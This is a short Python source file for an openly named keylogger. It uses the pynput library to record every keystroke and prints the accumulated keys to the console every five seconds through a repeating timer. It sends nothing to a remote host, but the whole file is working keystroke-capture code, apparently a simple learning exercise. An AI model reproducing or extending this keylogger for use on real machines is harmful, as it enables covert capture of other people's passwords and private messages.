import pynput.keyboard
import threading

from pynput import keyboard


class Keylogger:
    def __init__(self):
        self.keylogs = ""

    def append_to_keylogs(self, string):
        self.keylogs = self.keylogs + string

    def process_key_listein(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_keylogs(current_key)

    def report(self):
        print(self.keylogs)
        self.keylogs = ""
        timer = threading.Timer(5, self.report)
        timer.start()


    def start(self):
        with keyboard.Listener(on_press=self.process_key_listein) as keyboard_listener:
            self.report()
            keyboard_listener.join()

my_keylogger = Keylogger()
my_keylogger.start()
